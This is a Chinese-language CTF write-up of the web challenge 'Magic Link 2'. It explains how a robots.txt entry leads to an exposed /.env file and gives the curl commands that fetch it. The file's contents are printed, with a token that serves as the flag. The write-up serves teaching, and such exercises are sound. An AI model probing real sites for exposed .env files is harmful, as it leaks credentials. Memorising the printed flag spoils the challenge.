# Magic Link 2

## 题目信息

- 类型：Web
- 题目状态：已解出
- 目标：https://bluehens-magic-link.chals.io/
- 核心漏洞：`robots.txt` 暗示敏感路径，`/.env` 直接暴露环境变量

## 入口与现象

2026-04-18 实测首页是一个极简的 Magic Link 登录页，前端会把邮箱表单提交到 `/login`：

```html
<form id="magic-link-form">
  <input type="email" name="email" placeholder="Enter Email" required>
  <button type="submit">Send Magic Link</button>
</form>
```

提交任意邮箱后，后端会返回 JSON，里面还带了时间戳、内网 IP 和一个 `uuid`：

```json
{
  "datetime": "2026-04-18T09:49:19.610823+00:00",
  "email": "test@example.com",
  "ip-address": "10.1.0.20",
  "message": "Magic link generated, check your email.",
  "uuid": "1XUWJnNz6AT6mFycB8Et2g"
}
```

这说明应用后端没有把业务细节藏得很干净，但这里先不用急着猜 magic link 的构造，因为 `robots.txt` 已经给了更直接的入口：

```text
User-agent: *
Disallow: /inbox
Disallow: /dashboard
Disallow: /.env
```

在 CTF 里，`robots.txt` 明示敏感路径通常就是解题提示，优先去看这些被隐藏的入口。

## 分析过程

先访问 `/.env`：

```http
GET /.env HTTP/1.1
Host: bluehens-magic-link.chals.io
```

返回内容如下：

```text
TEDDYS_EMAIL=teddy@udctf.com
TEDDYS_TOKEN=udctf{d0n7_h057_y0ur_3nv_f113}
ADMIN_EMAIL=admin@udctf.com
INBOX_URL=http://localhost:5050/inbox?token=${TEDDYS_TOKEN}
```

到这里已经可以直接拿到 flag，核心原因很简单：

- 站点把 `.env` 文件直接暴露到了 Web 根目录。
- Teddy 的 token 被写在环境变量 `TEDDYS_TOKEN` 里。
- 这个 token 本身就是 flag。

顺手补一下站点行为，能帮助理解题目设计：

- 直接访问公开站点的 `/inbox` 会返回 `403 Forbidden`。
- 未登录访问 `/dashboard` 会 `302` 重定向回 `/`。
- `.env` 里的 `INBOX_URL=http://localhost:5050/...` 说明收件箱本来就在内部服务上，不需要真的打通 magic link 流程。

所以这题的真正突破点不是伪造登录，而是配置文件泄露。

## 利用过程

1. 打开首页，确认唯一可见功能是向 `/login` 发送邮箱。
2. 查看 `robots.txt`，发现它把 `/.env`、`/inbox`、`/dashboard` 都列出来了。
3. 直接请求 `/.env`。
4. 从返回的环境变量里读取 `TEDDYS_TOKEN`，得到 flag。

## 关键 payload / 命令

```bash
curl -i https://bluehens-magic-link.chals.io/
curl -i https://bluehens-magic-link.chals.io/robots.txt
curl -i https://bluehens-magic-link.chals.io/.env
```

关键响应：

```text
TEDDYS_EMAIL=teddy@udctf.com
TEDDYS_TOKEN=udctf{d0n7_h057_y0ur_3nv_f113}
ADMIN_EMAIL=admin@udctf.com
INBOX_URL=http://localhost:5050/inbox?token=${TEDDYS_TOKEN}
```

## Flag

```text
udctf{d0n7_h057_y0ur_3nv_f113}
```

## 总结

这题是典型的敏感文件泄露。表面上是 Magic Link 登录系统，实际上 `robots.txt` 已经把 `/.env` 这个关键入口直接暴露出来了。只要有先看配置文件和隐藏路径的习惯，这题基本可以很快结束。
